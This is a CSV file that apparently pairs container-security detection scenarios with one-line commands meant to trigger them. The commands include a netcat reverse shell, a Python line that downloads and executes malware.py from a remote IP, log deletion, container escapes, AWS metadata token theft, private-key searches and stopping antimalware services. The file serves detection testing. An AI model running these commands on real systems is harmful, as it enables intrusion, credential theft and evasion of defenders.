file_name,container_name,command,,,,,
Clear System Logs,clear-system-logs,rm /var/log/syslog; rm /var/log/messages; rm /var/log/auth.log; rm /var/log/secure; rm /var/log/boot.log; rm /var/log/maillog; rm /var/log/mail.log; rm /var/log/kern.log; rm /var/log/dmesg; rm /var/log/faillog; rm /var/log/cron; rm /var/log/daemon.log; rm /var/log/btmp; rm /var/log/mysqld.log; rm /var/log/mysql.log; rm /var/log/xferlog; sleep infinity,,,,,
Cloud credentials accessed by network utility,cloud-access-network-utility,"TOKEN=`curl -X PUT ""http://169.254.169.254/latest/api/token"" -H ""X-aws-ec2-metadata-token-ttl-seconds: 21600""`; curl -H ""X-aws-ec2-metadata-token: $TOKEN"" http://169.254.169.254/; sleep infinity",,,,,
Compiler executed in container,compiler-executed,gcc -o memfd-exec memfd-exec.c,,,,,
Container escape using docker socket,container-escape-docker-socket,docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt,,,,,
Container escape using runtime socket,container-escape-runtime-socket,"curl -s --unix-socket /var/run/docker.sock -H ""Content-Type: application/json"" -d ""{'Image':'alpine'",'Cmd':['sh','-c','echo Hello from Alpine'],'AttachStdout':true,"'AttachStderr':true}"" http://localhost/containers/create?name=alpine-from-api"
Container escape via cgroup,container-escape-cgroup,unshare -UrmC bash; mount -t cgroup -o memory cgroup /mnt,,,,,
Container management utility in container,container-management-utility,docker ps;kubectl get pods -A,,,,,
Credential access bash history,credential-access-bash-history,cat /.bash_history; rm /.zsh_history,,,,,
CryptoMiner Execution,crypto-miner-process,N/A,,,,,
Curl Using Socks Proxy,curl-using-proxy,curl -x socks4://proxy.example.com http://www.example.com/,,,,,
DB program spawned process,db-program-spawned-process,cp /bin/bash mysqld; ./mysqld -c whoami,,,,,
Debugfs Launched in Container,debugfs-launch,debugfs,,,,,
Exploit vsftpd Vulnerability,exploit-vsftp,cp /bin/bash vsftpd; ./vsftpd -c /bin/sh,,,,,
Find AWS Credentials,find-aws-cred,grep aws_access_key_id ~/.aws/credentials; fgrep secretaccesskey somefile.txt; grep hello file.txt; grep aws_secret_access_key config.txt; find / -name .aws/credentials; mlocate .aws/credentials; locate secrets.txt,,,,,
GDB Executed in Container,gdb-executed-in-container,gdb ./memfd-exec,,,,,
Insmod Executed in Container,insmod-modprobe,modprobe br_netfilter;insmod br_netfilter;sleep infinity,,,,,
Interactive shell spawned in container,interactive-shell,sh -i,,,,,
Kubernetes service account token created in container,kubernetes-service-account-token,kubectl create serviceaccount my-serviceaccount,,,,,
Launch Ingress Remote File Copy Tools in Container,ingress-remote-file-copy-tools,curl --location --request GET 'https://go.microsoft.com/fwlink/?linkid=2108834&Channel=Stable&language=en' --output foo.exe,,,,,
Launch Remote File Copy Tools in Container,remote-file-copy-tools,scp test@10.113.107.226:/home/Downloads/test.png .,,,,,
Local account password modified,local-account-passwd,passwd,,,,,
Netcat Reverse Shell Execution,nc-reverse-sh,nc -e /bin/bash 10.113.107.226 4444,,,,,
Network scanning utility,network-scanning,pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379,,,,,
Network utility executed,network-utility-tcpdump,tcpdump,,,,,
Package Management Process in Container,package-installed-in-containe,apt install tcpdump,,,,,
Polkit Local Privilege Escalation,polkit-privesc,./pwnkit,,,,,
Process Execution from Memory,process-exec-from-memory,N/A,,,,,
Process hidden using mount hidepid,process-hidden-using-mount,mount -o remount,hidepid=2 /proc,,,,
Process Hiding,process-hide,sed -i s/evil_script.py/pnscan/g /var/tmp/.11/..lph/processhider.c,,,,,
Python executed with suspicious arguments,python-exec-suspicious-arguements,"python3 -c 'import urllib.request; exec(urllib.request.urlopen(""http://10.113.107.226:8000/malware.py"").read())'",,,,,
Schedule Cron Jobs,schedule-cron-jobs,crontab -e,,,,,
Search Private Keys and Passwords,search-private-keys-passwords,"find / -name id_rsa; grep ""BEGIN RSA PRIVATE KEY"" ~/.ssh/id_rsa; find /home -name id_ed25519; egrep ""BEGIN OPENSSH PRIVATE KEY"" ~/.ssh/id_ed25519; fgrep ""BEGIN PRIVATE KEY"" ~/.ssh/id_ecdsa",,,,,
Stop Antimalware Process,anti-malware-processes,service aliyun.service stop; service apparmor stop; service bcm-agent stop; service aegis stop,,,,,
Sudo Potential Privilege Escalation,sudoedit-privesc,cd ~/exp; su test; ./exp; whoami > whoami.txt,,,,,
Usage of Steganography tools,steganografy-tools,steghide embed -cf -ef secret.txt test.jpg,,,,,
